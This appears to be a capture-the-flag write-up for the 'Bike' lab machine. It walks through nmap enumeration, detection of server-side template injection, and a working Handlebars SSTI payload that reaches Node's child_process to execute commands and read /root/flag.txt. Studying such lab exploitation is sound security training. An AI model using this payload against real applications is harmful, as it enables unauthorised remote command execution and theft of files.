
>[!tldr] Bike is a very easy Linux machine that introduces Server-Side Template Injection (SSTI) in a Node.js application using the Handlebars template engine. The #SSTI in the web application can be leveraged to escape the sandbox environment and achieve command execution via Node.js global objects.

# Adventure Mode
---
1. Starting off with a nmap scan 
	`nmap -sT 10.129.97.64 -p- --stats-every=5s`
	-> Ports: `22` and `80`
	`nmap -sCV 10.129.97.64 -p22,80`
```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
2. Lets check out port `80` and there's a "Under Construction" website. I check the source code and there's nothing special, the only thing on the main website is a input for a email, I read about `SSTI` (*Server-Side Template Injection*) on `portswigger` 
	Detect SSTI -> `${{<%[%'"}}%\` a
	 - We got a exception or error! So SSTI probably works. One of the error directories is `/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js`. Just noticing that the node_module uses `handlebars`
	 - So i found `CVE-2021-23369: Handlebars RCE Vulnerability`
3. Lets try to use `CVE-2021-23369: Handlebars RCE Vulnerability` to get remote command execution! Lets try stuff:
	1. `${7*7}` -> `/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js` (only useful output)
	2. Script `handlebars_exploit.py` -> Nothing
	- After some research i learn about `hacktricks` which actually had a payload for SSTI and the handlebars module specifically.
```java
{{#with "s" as |string|}} 
{{#with "e"}} 
{{#with split as |conslist|}} 
{{this.pop}} 
{{this.push (lookup string.sub "constructor")}} 
{{this.pop}} {{#with string.split as |codelist|}} 
{{this.pop}} {{this.push "return require('child_process').exec('whoami');"}} {{this.pop}} {{#each conslist}} 
{{#with (string.sub.apply 0 codelist)}} 
{{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}
```
- After sending this into the input the error states "ReferenceError: require is not defined" which is different from before. After more research i find that the payload itself doesn't work so we have to modify it.
	- After several iterations and enumerating the root directory i have ->
```java
{{#with "s" as |string|}} 
{{#with "e"}} 
{{#with split as |conslist|}} 
{{this.pop}} 
{{this.push (lookup string.sub "constructor")}} 
{{this.pop}} {{#with string.split as |codelist|}} 


{{this.pop}} {{this.push "return global.process.mainModule.require('child_process').execSync('cat /root/flag.txt')"}} 


{{this.pop}} {{#each conslist}} 
{{#with (string.sub.apply 0 codelist)}} 
{{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}
```
- Flag -> `[REDACTED_FLAG]`